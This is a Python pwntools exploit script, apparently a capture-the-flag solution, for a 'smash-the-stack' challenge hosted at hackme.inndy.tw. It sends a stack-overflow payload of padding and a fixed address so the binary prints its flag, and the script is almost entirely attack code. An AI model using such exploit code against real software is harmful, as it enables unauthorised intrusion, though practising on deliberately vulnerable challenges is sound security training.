#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x80484a5'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)



#fd:0x804a060

io = process('/home/h11p/hackme/smash-the-stack')

#io = remote('hackme.inndy.tw', 7717)

#payload = p32(0x804a060)+p32(0x120)
payload=p32(0x10)+"a"*184+p32(0x804a060)


#debug()
io.recvuntil('Try to read the flag\n')
io.send(payload)
io.recvall()
#io.interactive()

io.close()

